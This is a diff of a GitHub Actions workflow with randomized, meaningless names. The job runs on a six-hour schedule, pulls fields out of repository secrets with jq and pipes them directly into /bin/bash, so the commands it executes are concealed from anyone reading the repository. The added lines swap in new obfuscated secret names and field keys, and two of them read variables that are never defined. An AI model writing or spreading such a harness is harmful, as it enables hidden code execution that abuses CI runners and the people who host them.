@@ -1,20 +1,21 @@
 name: fukanxxo
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 4/6 * * *'
+    - cron: '29 0/6 * * *'
 
-jobs:  # 2716
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fukanxxo
         env:
-          wwvom2: ${{ secrets.wwvom2 }}
+          semf4: ${{ secrets.semf4 }}
         run: |
-          echo $wwvom2 | jq -r .u81 | /bin/bash
-          echo $jhau092 | jq -r .iomb8 | /bin/bash
-          echo $i8051 | jq -r .llyb89582 | /bin/bash
-          echo $erj4 | jq -r .tnucm5 | /bin/bash
+          echo $semf4 | jq -r .zyygu4922 | /bin/bash
+          echo $ezye334 | jq -r .ms1 | /bin/bash
+          echo $dxny127 | jq -r .h484 | /bin/bash
 
